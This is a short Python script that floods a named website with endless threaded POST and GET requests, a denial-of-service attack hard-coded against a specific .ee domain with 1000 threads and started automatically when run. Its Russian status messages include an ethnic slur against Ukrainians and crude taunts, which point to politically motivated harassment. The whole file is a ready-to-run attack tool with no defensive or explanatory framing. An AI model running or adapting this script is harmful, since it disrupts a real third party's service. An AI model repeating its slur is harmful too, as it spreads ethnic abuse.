import requests

from threading import Thread

attack_url = 'https://vabaduse.ope.ee'
attack_threads = 1000

def perform_ddos(url, num_threads):
    while True:
        try:
            response_post = requests.post(url)
            response_get = requests.get(url)
            
            if response_post.status_code == 429 or response_get.status_code == 429:
                print('Za, мы освобождаем сайт.')
                return

            print("Сайт захвачен хахлами.")

        except Exception:
            print("Инет параша")

def start_ddos_attack(url=attack_url, num_threads=attack_threads):
    threads = []

    for _ in range(num_threads):
        thread = Thread(target=perform_ddos, args=(url, num_threads))
        threads.append(thread)

    for thread in threads:
        thread.start()

    print(f'{num_threads} потоков начинает жоско иметь сайт')

start_ddos_attack()
